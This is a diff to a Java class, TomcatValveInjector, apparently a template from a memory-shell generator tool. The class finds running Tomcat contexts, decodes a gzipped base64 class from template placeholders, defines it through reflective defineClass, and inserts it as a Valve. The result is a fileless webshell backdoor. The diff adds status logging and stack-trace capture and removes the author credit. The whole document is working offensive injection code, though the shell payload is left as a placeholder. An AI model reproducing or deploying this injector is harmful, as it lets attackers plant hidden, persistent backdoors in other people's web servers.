@@ -3,42 +3,53 @@ package org.leo.jmg.mem.injectortpl.tomcat;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.*;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author pen4uin, ReaJason
  */
 public class TomcatValveInjector {
 
-    private static String shellClassName;
-    private static String shellClass;
-    private static boolean ok;
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() {
+        return "{{base64Str}}";
+    }
 
     public TomcatValveInjector() {
         if (ok) {
             return;
         }
-        Set<Object> contexts;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-            contexts = null;
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null && !contexts.isEmpty()) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-                } catch (Throwable ignored) {
+                    msg += "[/*] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
+        System.out.println(msg);
     }
 
     public Set<Object> getContext() throws Exception {
@@ -79,17 +90,35 @@ public class TomcatValveInjector {
     }
 
     @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
+    }
+
+    @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = context.getClass().getClassLoader();
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
@@ -99,12 +128,17 @@ public class TomcatValveInjector {
         Object[] valves = (Object[]) invokeMethod(pipeline, "getValves", null, null);
         List<Object> valvesList = Arrays.asList(valves);
         for (Object v : valvesList) {
-            if (v.getClass().getName().contains(shellClassName)) {
+            if (v.getClass().getName().contains(getClassName())) {
                 return;
             }
         }
         Class valveClass = context.getClass().getClassLoader().loadClass("org.apache.catalina.Valve");
         invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve});
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -182,4 +216,18 @@ public class TomcatValveInjector {
         }
     }
 
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
+    }
 }
